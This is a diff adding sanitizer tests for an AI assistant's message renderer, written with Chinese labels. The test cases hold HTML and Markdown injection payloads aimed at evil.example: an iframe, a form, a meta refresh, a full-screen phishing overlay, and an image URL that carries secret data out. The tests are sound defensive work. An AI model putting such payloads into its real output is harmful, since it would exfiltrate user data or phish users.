@@ -68,6 +68,35 @@ describe('助手文本', () => {
     expect(w.text()).toContain('<script>alert(1)</script>')
   })
 
+  it.each([
+    ['反斜杠转义的反引号', 'hi \\`<iframe src="https://evil.example"></iframe>\\` there'],
+    ['信息串带反引号的假围栏', '```a`\n<form action="https://evil.example"><input></form>'],
+    ['meta 刷新', '<meta http-equiv="refresh" content="0;url=https://evil.example">'],
+    ['全屏覆盖层', '<div style="position:fixed;inset:0;background:#fff">钓鱼</div>'],
+    ['外链图片', '<img src="https://evil.example/pixel.png">'],
+  ])('绕过尝试（%s）渲染不出危险元素', async (_name, content) => {
+    const w = await render(assistant(content))
+
+    const present = [...w.element.querySelectorAll('iframe,form,input,meta,style,img,object,embed,link,base')]
+    expect(present.map((el) => el.tagName)).toEqual([])
+    // 文本里会看到 `position:fixed` 字样（被转义成了文本），但不能有元素真的带这个样式。
+    const overlays = [...w.element.querySelectorAll('[style]')].filter((el) =>
+      (el.getAttribute('style') ?? '').includes('position'),
+    )
+    expect(overlays).toEqual([])
+  })
+
+  it.each([
+    ['裸 URL（库会给链接加载域名的 favicon）', '详见 https://secret-data.evil.example 。'],
+    ['裸 URL 后跟引号', '参数 src="https://evil.example" 如上'],
+    ['Markdown 链接', '[点这里](https://secret-data.evil.example/path)'],
+    ['Markdown 图片（URL 里可以带数据）', '![x](https://evil.example/p.png?d=secret)'],
+  ])('%s 不会触发任何外部图片请求', async (_name, content) => {
+    const w = await render(assistant(content))
+
+    expect([...w.element.querySelectorAll('img')].map((el) => el.getAttribute('src'))).toEqual([])
+  })
+
   it('代码块里的 HTML 照原样显示', async () => {
     const w = await render(assistant('```html\n<div class="a">x</div>\n```'))
 
